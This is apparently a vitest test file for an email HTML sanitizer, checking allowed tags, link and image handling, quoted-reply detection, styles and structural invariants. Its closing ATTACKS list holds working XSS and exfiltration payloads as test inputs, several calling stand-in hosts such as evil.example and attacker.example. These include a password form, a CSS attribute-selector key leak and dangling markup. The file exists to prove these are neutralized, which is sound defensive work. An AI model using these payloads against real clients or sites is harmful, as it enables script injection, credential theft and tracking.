// mail.parse: what an email may contain (sinter/tags.ts), checked URLs and images, ids only for in-email
// links, the table structure the components need, the options and the cache; over the corpus, the
// invariants every tree must keep; and attacks, which must leave nothing that runs or loads.
import { readdirSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, expect, test } from 'vitest';
import { parse } from '../sinter/parse.js';
import { plain } from '../sinter/plain.js';
import { text } from '../sinter/tree.js';
const plainLight = (text: string) => plain(text).light;
import { attrsOf, DROP, TAGS } from '../sinter/tags.js';
import type { Body, Element, Node, Tag } from '../sinter/sinter.types.js';

const CORPUS = join(import.meta.dirname, 'corpus');

/** the tree as tags and texts, for readable expectations */
const shape = (n: Node | Body): unknown =>
  n.type === 'text' ? n.value : n.type === 'body' ? n.children.map(shape) : [n.tag, ...n.children.map(shape)];
const els = (n: Node | Body): Element[] => {
  const out: Element[] = [];
  const walk = (x: Node | Body) => {
    if (x.type === 'text') return;
    if (x.type === 'element') out.push(x);
    x.children.forEach(walk);
  };
  walk(n);
  return out;
};
const first = (b: Body, tag: Tag) => els(b).find((e) => e.tag === tag)!;

describe('elements', () => {
  test('the body is the root; head and comments are gone', () => {
    expect(shape(parse('<head><title>t</title></head><body><p>a<!-- c -->b</p></body>'))).toEqual([['p', 'ab']]);
  });
  test('dropped with their content, renamed, unknown as span', () => {
    const b = parse('<div>a<script>x()</script><iframe src="https://x.example"></iframe><form><input value=1>b</form><o:p>c</o:p><label>d</label><big>e</big></div>');
    expect(shape(b)).toEqual([['div', 'a', ['span', 'c'], ['span', 'd'], ['span', 'e']]]);
  });
  test('<style> anywhere is read, not shown', () => {
    const b = parse('<p>a</p><style>p { color: red }</style>');
    expect(shape(b)).toEqual([['p', 'a']]);
    expect(first(b, 'p').style.color).toBe('red');
  });
  test('tables: implied tbody, whitespace between cells and rows dropped, stray text moved before', () => {
    const b = parse('<table>\n <tr>\n  <td>a</td>x<td>b</td>\n </tr>\n</table>');
    expect(shape(b)).toEqual(['x', ['table', ['tbody', ['tr', ['td', 'a'], ['td', 'b']]]]]);
  });
  test('only the tag’s attributes, values checked', () => {
    const b = parse('<td colspan="3x"><ol start=" 4 " type="a" onclick="x()" class="c" data-x="1"><li value="7">a</li></ol><td colspan=99999 rowspan=2>');
    const ol = first(b, 'ol');
    expect(ol.attrs).toEqual({ start: '4', type: 'a' });
    expect(first(b, 'li').attrs).toEqual({ value: '7' });
  });
  test('every attribute in the tree is one its tag keeps', () => {
    const b = parse('<p dir=RTL lang=de title=t style="x" align=center>a</p><bdo dir=sideways>b</bdo>');
    expect(first(b, 'p').attrs).toEqual({ dir: 'rtl', lang: 'de', title: 't' });
    expect(first(b, 'bdo').attrs).toEqual({});
  });
});

test('a layout table keeps role="presentation" (or none), and no other role is kept anywhere', () => {
  const roles = (html: string) => els(parse(html)).map((e) => e.attrs.role);
  expect(roles('<table role="presentation"><tr><td>a</td></tr></table>')).toEqual(['presentation', undefined, undefined, undefined]);
  expect(roles('<table role=" None "><tr><td>a</td></tr></table>')[0]).toBe('none');
  // ARIA's fallback list: the first role decides
  expect(roles('<table role="presentation none"><tr><td>a</td></tr></table>')[0]).toBe('presentation');
  expect(roles('<table role="grid presentation"><tr><td>a</td></tr></table>')[0]).toBeUndefined();
  // a role elsewhere, or another one on a table, is dropped: an email does not make buttons or alerts of the page
  expect(roles('<div role="presentation">a</div><span role="button">b</span><table role="alert"><tr><td role="presentation">c</td></tr></table>').filter(Boolean)).toEqual([]);
});

describe('links', () => {
  test('http, https, mailto and tel only, normalized', () => {
    const hrefs = ['https://a.example/x y', 'HTTP://A.example', 'mailto:a@b.example', 'tel:+1 555', 'javascript:alert(1)', ' jav\tascript:alert(1)', 'data:text/html,x', 'vbscript:x', '/relative', 'ftp://x.example', '//x.example']
      .map((h) => first(parse(`<a href="${h}">x</a>`), 'a').attrs.href);
    expect(hrefs).toEqual(['https://a.example/x%20y', 'http://a.example/', 'mailto:a@b.example', 'tel:+1 555', undefined, undefined, undefined, undefined, undefined, undefined, undefined]);
  });
  test('an in-email fragment keeps its target, prefixed; others lose theirs', () => {
    const b = parse('<a href="#top">up</a><a href="#nowhere">x</a><h1 id="top">T</h1><p id="other">p</p><a name="old"></a><a href="#old">o</a>');
    const [up, nowhere, , old] = els(b).filter((e) => e.tag === 'a');
    expect(up.attrs.href).toBe('#mail-top');
    expect(nowhere.attrs.href).toBeUndefined();
    expect(first(b, 'h1').attrs.id).toBe('top');
    expect(first(b, 'p').attrs.id).toBeUndefined();
    expect(old.attrs.href).toBe('#mail-old');
    expect(els(b).filter((e) => e.tag === 'a')[2].attrs.id).toBe('old');
  });
  test('a duplicated id is kept once', () => {
    const b = parse('<a href="#x">x</a><p id="x">1</p><p id="x">2</p>');
    expect(els(b).filter((e) => e.attrs.id === 'x')).toHaveLength(1);
  });
});

describe('images', () => {
  const HTML = '<img src="https://img.example/a.png" alt="A" width="10" height="20"><img src="http://other.example/b.gif"><img src="cid:logo@x"><img src="data:image/png;base64,iVBORw0KGgo="><img src="data:image/svg+xml;base64,PHN2Zz4="><img src="/rel.png">';
  const srcs = (b: Body) => els(b).filter((e) => e.tag === 'img').map((e) => e.attrs.src);
  test('blocked by default, boxes and origins kept', () => {
    const b = parse(HTML);
    expect(srcs(b)).toEqual([undefined, undefined, undefined, 'data:image/png;base64,iVBORw0KGgo=', undefined, undefined]);
    expect(first(b, 'img').attrs).toEqual({ alt: 'A', width: '10', height: '20' });
    expect(b.images.origins).toEqual(['http://other.example', 'https://img.example']);
  });
  test('allow', () => {
    expect(srcs(parse(HTML, { images: 'allow' })).slice(0, 2)).toEqual(['https://img.example/a.png', 'http://other.example/b.gif']);
  });
  test('proxy', () => {
    expect(srcs(parse(HTML, { images: 'proxy', proxy: '/img?url={url}' })).slice(0, 2)).toEqual(['/img?url=https%3A%2F%2Fimg.example%2Fa.png', '/img?url=http%3A%2F%2Fother.example%2Fb.gif']);
  });
  test('cid: a map or a template', () => {
    expect(srcs(parse(HTML, { cid: { '<logo@x>': 'data:image/png;base64,AAAA' } }))[2]).toBe('data:image/png;base64,AAAA');
    expect(srcs(parse(HTML, { cid: '/att?msg=4&cid={cid}' }))[2]).toBe('/att?msg=4&cid=logo%40x');
    expect(srcs(parse(HTML, { cid: { 'logo@x': 'javascript:alert(1)' } }))[2]).toBeUndefined();
  });
  test('data: images up to the bound', () => {
    expect(srcs(parse(HTML, { dataImages: 10 }))[3]).toBeUndefined();
  });
  test('a pixel (at most 1 × 1, by attributes or CSS) is left out, and its origin is not listed', () => {
    const alts = (html: string) => els(parse(html, { images: 'allow' })).filter((e) => e.tag === 'img').map((e) => e.attrs.alt);
    const img = (alt: string, rest = '') => `<img src="https://t.example/${alt}.gif" alt="${alt}"${rest}>`;
    expect(alts([
      img('attrs', ' width="1" height="1"'), img('zero', ' width="0" height="0"'), img('css', ' style="width:1px;height:1px"'),
      img('half', ' style="width:0.5px;height:0"'), img('mixed', ' width="1" style="height:1px"'),
      img('spacer', ' width="1" height="20"'), img('stretched', ' width="1" height="1" style="width:100px"'),
      img('wide', ' width="600"'), img('unsized'),
    ].join(''))).toEqual(['spacer', 'stretched', 'wide', 'unsized']);
    expect(parse(img('p', ' width="1" height="1"'), { images: 'allow' }).images.origins).toEqual([]);
    expect(parse(`<p>a${img('p', ' width="1" height="1"')}b</p>`).children).toEqual([expect.objectContaining({ tag: 'p', children: [{ type: 'text', value: 'ab' }] })]);
  });
});

describe('quoted history and signatures, as mail clients mark them', () => {
  /** the tree as tags, a part after its tag (`div:quote`), and texts */
  const parts = (n: Node | Body): unknown =>
    n.type === 'text' ? n.value.trim() || null : n.type === 'body' ? n.children.map(parts).filter((x) => x !== null)
      : [n.part ? `${n.tag}:${n.part}` : n.tag, ...n.children.map(parts).filter((x) => x !== null)];
  test('Gmail: the gmail_quote div, its "On … wrote:" line inside (the corpus reply)', () => {
    const b = parse(readFileSync(join(CORPUS, 'reply.html'), 'utf8'));
    expect(b.quotes).toBe(true);
    const quotes = els(b).filter((e) => e.part === 'quote');
    expect(quotes[0]!.tag).toBe('div');
    expect(text(quotes[0]!.children[0]!)).toBe('On Mon, Nov 16, 2026 at 9:12 AM Sam Example <sam@example.com> wrote:');
    // what the reply says is not quoted
    expect(els(b).find((e) => e.part === 'quote' && JSON.stringify(e).includes('Sounds good'))).toBeUndefined();
  });
  test('Apple Mail and Thunderbird: blockquote type="cite"; Thunderbird\'s "On … wrote:" too', () => {
    expect(parts(parse('<div>Yes.</div><div><br><blockquote type="cite"><div>On Monday, Sam wrote:</div><div>Lunch?</div></blockquote></div>')))
      .toEqual([['div', 'Yes.'], ['div', ['br'], ['blockquote:quote', ['div', 'On Monday, Sam wrote:'], ['div', 'Lunch?']]]]);
    expect(parts(parse('<p>Yes.</p><div class="moz-cite-prefix">On 16.11.26 Sam wrote:<br></div><blockquote type="cite" cite="mid:x@y">Lunch?</blockquote>')))
      .toEqual([['p', 'Yes.'], ['div:quote', 'On 16.11.26 Sam wrote:', ['br']], ['blockquote:quote', 'Lunch?']]);
  });
  test('Outlook on the web: from its marker to the end of the parent, one div, the rule before it included', () => {
    const owa = '<div>Yes.</div><div id="appendonsend"></div><hr style="display:inline-block;width:98%" tabindex="-1"><div id="divRplyFwdMsg" dir="ltr"><b>From:</b> Sam</div><div>Lunch?</div>';
    expect(parts(parse(owa))).toEqual([['div', 'Yes.'], ['div:quote', ['div'], ['hr'], ['div', ['b', 'From:'], 'Sam'], ['div', 'Lunch?']]]);
    // without appendonsend: the rule right before divRplyFwdMsg starts it
    expect(parts(parse('<p>Yes.</p><hr><div id="divRplyFwdMsg">From: Sam</div><div>Lunch?</div>')))
      .toEqual([['p', 'Yes.'], ['div:quote', ['hr'], ['div', 'From: Sam'], ['div', 'Lunch?']]]);
    // a thread written flat: the history it quotes in turn is a quote in the quote
    expect(parts(parse('<p>C</p><div id="divRplyFwdMsg">From: B</div><p>B</p><div id="divRplyFwdMsg">From: A</div><p>A</p>')))
      .toEqual([['p', 'C'], ['div:quote', ['div', 'From: B'], ['p', 'B'], ['div:quote', ['div', 'From: A'], ['p', 'A']]]]);
  });
  test('Outlook for Windows: its header block (in a div of its own) and what follows, in any language', () => {
    const word = '<div class="WordSection1"><p class="MsoNormal">Yes.</p><div><div style="border:none;border-top:solid #E1E1E1 1.0pt;padding:3.0pt 0cm 0cm 0cm"><p class="MsoNormal"><b>Von:</b> Sam</p></div></div><p class="MsoNormal">Mittag?</p></div>';
    expect(parts(parse(word))).toEqual([['div', ['p', 'Yes.'], ['div:quote', ['div', ['div', ['p', ['b', 'Von:'], 'Sam']]], ['p', 'Mittag?']]]]);
    // a border-top alone is not the header
    expect(parse('<div style="border-top:1px solid #ccc">Section</div><p>more</p>').quotes).toBeUndefined();
  });
  test('Yahoo, Proton, new Outlook', () => {
    for (const html of ['<div class="yahoo_quoted">x</div>', '<blockquote class="protonmail_quote">x</blockquote>', '<div id="mail-editor-reference-message-container">x</div>'])
      expect(els(parse(html))[0]!.part, html).toBe('quote');
  });
  test('signatures: Gmail, Thunderbird, Outlook', () => {
    for (const html of ['<div class="gmail_signature" data-smartmail="gmail_signature">Robin</div>', '<div data-smartmail="gmail_signature">Robin</div>', '<div class="moz-signature">-- Robin</div>', '<div id="Signature">Robin</div>', '<div id="ms-outlook-mobile-signature">Robin</div>'])
      expect(els(parse(html))[0]!.part, html).toBe('signature');
  });
  test('not quoted: a newsletter\'s blockquote, a class that only reads alike, a table\'s structure', () => {
    const b = parse('<blockquote>A quotation</blockquote><div class="quote">x</div><p class="gmail_quote_like">y</p><table><tr><td>z</td></tr></table>');
    expect(els(b).filter((e) => e.part)).toEqual([]);
    expect(b.quotes).toBeUndefined();
    // a marker in a cell: the rest of the cell
    expect(parts(parse('<table><tr><td>Yes.<div id="divRplyFwdMsg">From: Sam</div>Lunch?</td></tr></table>')))
      .toEqual([['table', ['tbody', ['tr', ['td', 'Yes.', ['div:quote', ['div', 'From: Sam'], 'Lunch?']]]]]]);
  });
});

describe('options', () => {
  test('invalid options throw', () => {
    expect(() => parse('', { images: 'maybe' as 'allow' })).toThrow(/images/);
    expect(() => parse('', { images: 'proxy' })).toThrow(/proxy/);
    expect(() => parse('', { images: 'proxy', proxy: 'http://p.example/?u={url}' })).not.toThrow();
    expect(() => parse('', { images: 'proxy', proxy: 'javascript:{url}' })).toThrow(/proxy/);
    expect(() => parse('', { images: 'proxy', proxy: '//p.example/{url}' })).toThrow(/proxy/);
    expect(() => parse('', { cid: '/x' })).toThrow(/cid/);
    expect(() => parse('', { media: 'tv' as 'wide' })).toThrow(/media/);
    expect(() => parse('', { dataImages: -1 })).toThrow(/dataImages/);
  });
  test('the same source and options give the same frozen tree', () => {
    const a = parse('<p>x</p>', { cid: { b: '/1', a: '/2' } });
    expect(parse('<p>x</p>', { cid: { a: '/2', b: '/1' } })).toBe(a);
    expect(Object.isFrozen(a.children[0])).toBe(true);
    expect(parse('<p>x</p>')).not.toBe(a);
    expect(parse(null)).toEqual({ type: 'body', style: {}, children: [], images: { origins: [] } });
  });
});

describe('styles', () => {
  test('legacy attributes and rules become the element’s style; the body’s go to the root', () => {
    const b = parse('<body bgcolor="#eeeeee" style="font-family: Arial"><table cellpadding=4><tr><td bgcolor=red>x</table></body>');
    expect(b.style['background-color']).toBeDefined();
    expect(b.style['font-family']).toBeDefined();
    const td = first(b, 'td');
    expect(td.style['background-color']).toBeDefined();
    expect(td.style['padding-top']).toBe('4px');
  });
  test('only the properties the tag binds', () => {
    const b = parse('<br style="color:red; clear:both"><p style="border-collapse:collapse; color:red">x</p>');
    expect(first(b, 'br').style).toEqual({ clear: 'both' });
    expect(first(b, 'p').style).toEqual({ color: 'red' });
  });
});

// ── Invariants over every tree ────────────────────────────────────────────────────────────────────────

const SAFE_HREF = /^(?:https?:|mailto:|tel:|#mail-)/;
const BAD_STYLE = /url\(|image\(|image-set\(|\\|expression|javascript|var\(|calc\(/i;
const TABLE_KIDS: Partial<Record<Tag, Tag[]>> = { table: ['caption', 'colgroup', 'thead', 'tbody', 'tfoot'], colgroup: ['col'], thead: ['tr'], tbody: ['tr'], tfoot: ['tr'], tr: ['td', 'th'] };

/** what every tree must keep, whatever its source */
function invariants(b: Body, options: { images?: string } = {}): void {
  const walk = (n: Element, parent: Tag | 'body') => {
    expect(TAGS[n.tag], n.tag).toBeDefined();
    const kept = new Set(attrsOf(n.tag));
    for (const [k, v] of Object.entries(n.attrs)) {
      expect(kept.has(k as never), `${n.tag}[${k}]`).toBe(true);
      if (k === 'href') expect(v).toMatch(SAFE_HREF);
    }
    if (n.tag === 'img' && n.attrs.src !== undefined) {
      if (options.images === 'block' || !options.images) expect(n.attrs.src).toMatch(/^data:image\/(?:png|jpe?g|gif|webp|avif);base64,/);
    }
    const props = new Set(TAGS[n.tag].props);
    for (const [p, v] of Object.entries(n.style)) {
      expect(props.has(p as never), `${n.tag} ${p}`).toBe(true);
      expect(v, `${n.tag} ${p}: ${v}`).not.toMatch(BAD_STYLE);
    }
    // a table part stands only in its table's structure (the components render it there and only there)
    if (TAGS[n.tag].inTable) expect(parent !== 'body' && TABLE_KIDS[parent]?.includes(n.tag), `${n.tag} in ${parent}`).toBe(true);
    const allowed = TABLE_KIDS[n.tag];
    for (const c of n.children) {
      if (allowed) expect(c.type === 'element' && allowed.includes(c.tag), `${c.type === 'element' ? c.tag : 'text'} in ${n.tag}`).toBe(true);
      if (c.type === 'element') walk(c, n.tag);
    }
    if (TAGS[n.tag].void) expect(n.children).toEqual([]);
  };
  for (const c of b.children) if (c.type === 'element') walk(c, 'body');
  for (const v of Object.values(b.style)) expect(v).not.toMatch(BAD_STYLE);
}

describe('colour schemes', () => {
  test('light: an email with colours of its own and no word on dark pages keeps a light canvas', () => {
    const light = (html: string) => parse(html).light;
    // written for a white page: a text colour, a background, on any element or the body
    expect(light('<p style="color:#333">a</p>')).toBe(true);
    expect(light('<table><tr><td bgcolor="#f4f4f4">a</td></tr></table>')).toBe(true);
    expect(light('<body style="background:#fff"><p>a</p></body>')).toBe(true);
    expect(light('<font color="navy">a</font>')).toBe(true);
    // no colours: it takes the page's, light or dark
    expect(light('<p><b>a</b> <a href="https://x.example">b</a></p>')).toBeUndefined();
    // colours only where it hides them do not count
    expect(light('<div style="display:none;color:#333">preheader</div><p>a</p>')).toBeUndefined();
    // it says they work on a dark page too: declared, or dark rules
    expect(light('<meta name="color-scheme" content="light dark"><p style="color:#333">a</p>')).toBeUndefined();
    expect(light('<style>p { color: #333 } @media (prefers-color-scheme: dark) { p { color: #eee } }</style><p>a</p>')).toBeUndefined();
    // declared light only: still for a white page
    expect(light('<meta name="color-scheme" content="light"><p style="color:#333">a</p>')).toBe(true);
    // mail.plain sets no colours
    expect(plainLight('> quoted\nhello')).toBeUndefined();
  });

  test('schemes: absent for an email that says nothing', () => {
    expect(parse('<p style="color: #333">a</p>').schemes).toBeUndefined();
  });
  test('an email declaring light and dark, with no rules for them, keeps its colours as written', () => {
    const b = parse(`<html lang="en" style="color-scheme: light dark"><head><meta name="color-scheme" content="light dark">
      <meta name="supported-color-schemes" content="light dark"></head><body><p><a href="https://example.com/" style="color: #a85fb0">a</a></p></body></html>`);
    expect(b.schemes).toEqual(['light', 'dark']);
    expect(first(b, 'a').style.color).toBe('#a85fb0');
  });
  test('an email with dark rules: dark, light-dark() on the elements and the root', () => {
    const b = parse(`<style>body { background-color: #f4f4f4; color: #111 } .card { background-color: #fff }
      @media (prefers-color-scheme: dark) { body { background-color: #000 !important; color: #ddd !important } .card { background-color: #1c1c1c !important } }</style>
      <body><div class="card">a</div></body>`);
    expect(b.schemes).toEqual(['dark']);
    expect(b.style).toMatchObject({ 'background-color': 'light-dark(#f4f4f4, #000)', color: 'light-dark(#111, #ddd)' });
    expect(first(b, 'div').style['background-color']).toBe('light-dark(#fff, #1c1c1c)');
  });
});

describe('repeated styles', () => {
  // the cascade computes one style per distinct (matched rules, inline style, legacy hints) and the tree
  // shares it (css/index.ts, parse.ts projected()): equal inputs, one object; any difference, its own
  test('elements with the same rules, inline style and hints share one style object, per tag', () => {
    const cell = '<td class="c" width="50%" style="padding:4px">x</td>';
    const b = parse(`<style>.c { color: red } .d { color: blue }</style><table><tr>${cell}${cell}<td class="c d" width="50%" style="padding:4px">y</td>${cell.replace('50%', '40%')}${cell.replace('4px', '5px')}</tr></table><p style="padding:4px">p</p><div style="padding:4px">d</div>`);
    const tds = els(b).filter((e) => e.tag === 'td');
    expect(tds[0].style).toBe(tds[1].style);
    expect(tds[0].style).toEqual({ color: 'red', width: '50%', 'padding-top': '4px', 'padding-right': '4px', 'padding-bottom': '4px', 'padding-left': '4px' });
    // another rule matched, other hints, another inline style: each its own
    expect(tds[2].style.color).toBe('blue');
    expect(tds[3].style.width).toBe('40%');
    expect(tds[4].style['padding-top']).toBe('5px');
    expect(new Set(tds.map((t) => t.style)).size).toBe(4);
    // the same inline style on two tags: equal, and frozen with the tree
    expect(first(b, 'p').style).toEqual(first(b, 'div').style);
    expect(Object.isFrozen(tds[0].style)).toBe(true);
  });

  test('an inline style that writes a `|` does not collide with another key', () => {
    const b = parse('<p style="font-family: \'a|1,\'">x</p><p style="font-family: \'a\'">y</p>');
    const ps = els(b).filter((e) => e.tag === 'p');
    expect(ps.map((p) => p.style['font-family'])).toEqual(['"a|1,"', '"a"']);
  });
});

describe('the corpus', () => {
  const files = readdirSync(CORPUS).filter((f) => f.endsWith('.html'));
  for (const f of files) {
    test(f, () => {
      const html = readFileSync(join(CORPUS, f), 'utf8');
      for (const images of ['block', 'allow'] as const) invariants(parse(html, { images }), { images });
      invariants(parse(html, { images: 'proxy', proxy: '/p?u={url}', media: 'narrow' }), { images: 'proxy' });
    });
  }
  test('the newsletter keeps its look', () => {
    const b = parse(readFileSync(join(CORPUS, 'newsletter.html'), 'utf8'));
    expect(b.style['background-color']).toBeDefined();
    const h1 = first(b, 'h1');
    expect(h1.style['font-size']).toBe('28px');
    expect(parse(readFileSync(join(CORPUS, 'newsletter.html'), 'utf8'), { media: 'narrow' }).children.length).toBeGreaterThan(0);
    expect(first(parse(readFileSync(join(CORPUS, 'newsletter.html'), 'utf8'), { media: 'narrow' }), 'h1').style['font-size']).toBe('22px');
    // the open-tracking pixel is left out: no request, and its origin is not offered to allow
    expect(b.images.origins).toEqual(['https://images.example.com']);
    expect(els(b).some((e) => e.attrs.alt === '' && e.tag === 'img')).toBe(false);
    const a = els(b).find((e) => e.tag === 'a' && e.attrs.href?.includes('/tools'))!;
    expect(a.style.color).toBe('#ffffff');
    // the preheader is hidden, as in every client
    expect(els(b).find((e) => e.style.display === 'none')).toBeDefined();
  });
});

// ── Attacks ───────────────────────────────────────────────────────────────────────────────────────────
// Each must leave no script, no handler, no unsafe URL, no remote load under 'block', no style that loads
// or escapes. The tree cannot hold a handler at all (attributes are per tag); these check the parse too.

const ATTACKS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)><circle/></svg>',
  '<body onload=alert(1)>x',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="&#106;avascript:alert(1)">x</a>',
  '<a href=" JaVaScRiPt:alert(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x">',
  '<form action="https://evil.example/steal"><input name=password type=password><button>Log in</button></form>',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<base href="https://evil.example/"><a href="/x">x</a>',
  '<link rel=stylesheet href="https://evil.example/x.css">',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  '<template><img src=x onerror=alert(1)></template>',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<!--><img src=x onerror=alert(1)>-->',
  '<textarea></textarea><img src=x onerror=alert(1)></textarea>',
  '<p id="location" name="cookie">x</p><form name="body"></form>',
  '<p style="background:url(https://tracker.example/p.gif)">x</p>',
  '<style>@import url(https://evil.example/x.css); p { background-image: url(https://tracker.example/q) }</style><p>x</p>',
  '<p style="width: expression(alert(1)); -moz-binding: url(x.xml#y); behavior: url(x.htc)">x</p>',
  '<p style="background: \\75 rl(https://tracker.example/r)">x</p>',
  '<div style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999">overlay</div>',
  '<div style="margin-top:-1000px">over the app</div>',
  '<style>p::before { content: "fake" } a:visited { color: red } input[value^="a"] { background: url(https://k.example/a) }</style><p>x</p>',
  '<style>@font-face { font-family: X; src: url(https://evil.example/f.woff) } p { font-family: X }</style><p>x</p>',
  '<video poster="https://tracker.example/v.jpg"></video><input type=image src="https://tracker.example/i">',
  '<img srcset="https://tracker.example/s.jpg 2x" lowsrc="https://tracker.example/l.jpg">',
  '<table background="https://tracker.example/t.jpg"><tr><td>x</table>',
  '<img src="https://attacker.example/?secret=<p>plaintext follows</p>',
  '<a href="https://ok.example" style="display:block;width:10000px;height:10000px">x</a>',
];

describe('attacks', () => {
  for (const html of ATTACKS) {
    test(html.slice(0, 70), () => {
      const b = parse(html);
      invariants(b);
      const json = JSON.stringify(b);
      expect(json).not.toMatch(/javascript:|vbscript:|data:text|onerror|onload|evil\.example|tracker\.example|\bk\.example|attacker\.example\/\?/i);
      for (const e of els(b)) {
        expect(e.style['margin-top'] ?? '', 'negative margin').not.toMatch(/^-/);
        expect(DROP.has(e.tag)).toBe(false);
      }
    });
  }
  test('nesting is bounded', () => {
    const b = parse('<div>'.repeat(5000) + 'x');
    let depth = 0;
    let n: Node | Body = b;
    while (n.type !== 'text' && n.children.length) {
      n = n.children[0];
      depth++;
    }
    expect(depth).toBeLessThanOrEqual(260);
  });
  test('a megabyte of email parses within a second', () => {
    const one = readFileSync(join(CORPUS, 'newsletter.html'), 'utf8');
    const body = one.slice(one.indexOf('<body'), one.indexOf('</body>'));
    const big = one.replace(body, body.repeat(Math.ceil(1_000_000 / body.length)));
    const t = performance.now();
    parse(big);
    expect(performance.now() - t).toBeLessThan(1000);
  });
});
